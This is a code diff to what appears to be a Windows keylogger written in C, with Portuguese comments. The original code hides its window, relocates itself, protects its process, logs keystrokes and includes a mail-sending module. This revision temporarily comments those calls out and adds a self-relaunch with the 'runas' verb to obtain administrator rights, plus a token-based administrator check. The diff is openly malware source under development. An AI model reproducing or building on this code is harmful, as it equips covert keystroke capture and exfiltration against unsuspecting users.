@@ -8,23 +8,35 @@
 #include <locale.h>
 #include <time.h>
 #include <string.h>
+#include <shellapi.h>
+#include <lmcons.h>
 #include "include/sendmail.h"
+#include "include/header.h"
 
 void KeyLogger();
 void MoveProgram();
 void ConvertToChar(int, FILE *);
 BOOL ProtectProcess();
 BOOL EnablePriv (const char *);
+BOOL IsCurrentUserLocalAdministrator(void);
 
-int main()
+int main(int argc, char* argv[])
 {
-	ShowWindow(GetForegroundWindow(), SW_HIDE);
-	MoveProgram();
-	ProtectProcess();
+	// ShowWindow(GetForegroundWindow(), SW_HIDE);
+	// MoveProgram();
+	// ProtectProcess();
 	
+	// Verifica se o programa possui permissões, se não possuir executa o ShellExecute com o verbo 'runas', para perdir permissão de administrador
+	if (!IsCurrentUserLocalAdministrator())
+      	ShellExecute(NULL, "runas", argv[0], NULL, NULL, SW_SHOWNORMAL);
+	
+	// Se mesmo pedindo permissão de administrador o usuario não concede-la, sair do programa
+	if (!IsCurrentUserLocalAdministrator())
+		exit(1);
+		
 	while(TRUE){
-		KeyLogger();
-		Sleep(1);
+		// KeyLogger();
+		// Sleep(1);
 	}
 	return (EXIT_SUCCESS);
 }
@@ -186,6 +198,92 @@ BOOL EnablePriv (const char *szPriv)
     BOOL bRet = AdjustTokenPrivileges (hToken, FALSE, &privs, sizeof(privs), NULL, NULL);
     CloseHandle (hToken);
     return bRet;
+}
+
+BOOL IsCurrentUserLocalAdministrator(void)
+{
+	BOOL   fReturn         = FALSE;
+	DWORD  dwStatus;
+	DWORD  dwAccessMask;
+	DWORD  dwAccessDesired;
+	DWORD  dwACLSize;
+	DWORD  dwStructureSize = sizeof(PRIVILEGE_SET);
+	PACL   pACL            = NULL;
+	PSID   psidAdmin       = NULL;
+
+	HANDLE hToken              = NULL;
+	HANDLE hImpersonationToken = NULL;
+
+	PRIVILEGE_SET   ps;
+	GENERIC_MAPPING GenericMapping;
+
+	PSECURITY_DESCRIPTOR     psdAdmin           = NULL;
+	SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;
+
+	const DWORD ACCESS_READ  = 1;
+	const DWORD ACCESS_WRITE = 2;
+
+	
+	if (!OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE|TOKEN_QUERY, TRUE, &hToken)){
+		if (GetLastError() != ERROR_NO_TOKEN)
+			return FALSE;
+
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_QUERY, &hToken))
+			return FALSE;
+
+		if (!DuplicateToken (hToken, SecurityImpersonation, &hImpersonationToken))
+			return FALSE;
+
+		if (!AllocateAndInitializeSid(&SystemSidAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,	0, 0, 0, 0, 0, 0, &psidAdmin))			
+			return FALSE;
+
+		psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
+		if (psdAdmin == NULL)
+			return FALSE;
+
+		if (!InitializeSecurityDescriptor(psdAdmin, SECURITY_DESCRIPTOR_REVISION))
+			return FALSE;
+
+		dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psidAdmin) - sizeof(DWORD);
+
+		pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
+		if (pACL == NULL)
+			return FALSE;
+
+		if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
+			return FALSE;
+
+		dwAccessMask= ACCESS_READ | ACCESS_WRITE;
+		if (!AddAccessAllowedAce(pACL, ACL_REVISION2, dwAccessMask, psidAdmin))
+			return FALSE;
+
+		if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
+			return FALSE;
+
+		SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE);
+		SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE);
+
+		if (!IsValidSecurityDescriptor(psdAdmin))
+			return FALSE;
+
+		dwAccessDesired = ACCESS_READ;
+		GenericMapping.GenericRead    = ACCESS_READ;
+		GenericMapping.GenericWrite   = ACCESS_WRITE;
+		GenericMapping.GenericExecute = 0;
+		GenericMapping.GenericAll     = ACCESS_READ | ACCESS_WRITE;
+
+		if (!AccessCheck(psdAdmin, hImpersonationToken, dwAccessDesired, &GenericMapping, &ps, &dwStructureSize, &dwStatus, &fReturn)) {
+			fReturn = FALSE;
+			return FALSE;
+		}
+	}
+
+	if (pACL) LocalFree(pACL);
+	if (psdAdmin) LocalFree(psdAdmin);
+	if (psidAdmin) FreeSid(psidAdmin);
+	if (hImpersonationToken) CloseHandle (hImpersonationToken);
+	if (hToken) CloseHandle (hToken);
+	return fReturn;
 }
 
 //MesageBox(	NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
